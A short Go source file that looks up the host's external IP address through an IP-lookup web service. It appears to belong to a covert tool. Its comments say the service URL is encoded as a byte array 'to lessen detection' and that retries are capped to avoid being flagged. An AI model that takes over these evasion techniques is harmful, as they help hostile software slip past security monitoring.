package network

import (
	"net/http"
	"strings"
)

var (
	// API to get the external IPV4 address from.
	// This can be changed if the formatting of the IP address returned is the same.
	// Initialized as a byte array to lessen detection (string form: 'http://api.ipify.org').
	IP_API = []byte{104, 116, 116, 112, 58, 47, 47, 97, 112, 105, 46, 105, 112, 105, 102, 121, 46, 111, 114, 103}

	// IP API request counter.
	// This is used for checking if the MAX_REQ_ATTEMPTS has been reached.
	RequestsToAPI int
)

// `GetIPAddress` returns the external IP address of the current computer.
// The function makes a request to the "http://api.ipify.org" API to retrieve the IP address.
// If an error occurs during the retrieval process or there have been too many requests to the server,
// defined by `MAX_REQ_ATTEMPTS`, "Unknown" is returned in place of the IP address.
func GetIPAddress() string {
	RequestsToAPI++

	// Use the net/http package to make a GET request to the "http://api.ipify.org" API.
	resp, err := http.Get(string(IP_API))
	if err != nil {
		if RequestsToAPI >= MAX_REQ_ATTEMPTS {
			return "Unknown"
		} else {
			return GetIPAddress()
		}
	}

	// Close the response body when the function returns.
	defer resp.Body.Close()

	// Create a byte slice to store the response body.
	var ipBuilder strings.Builder

	// Read the response body to retrieve the IP address as a string.
	buffer := make([]byte, 1024)
	for {
		n, err := resp.Body.Read(buffer)
		if n > 0 {
			ipBuilder.Write(buffer[:n])
		}
		if err != nil {
			break
		}
	}

	// Return the IP address as a string.
	return ipBuilder.String()
}

// Maximum retry attempts before returning an empty string from `GetIPAddress`.
// This is in place to deter constant retries in case the API we're calling is down
// or the request is blocked, as it could be flagged.
const MAX_REQ_ATTEMPTS = 2
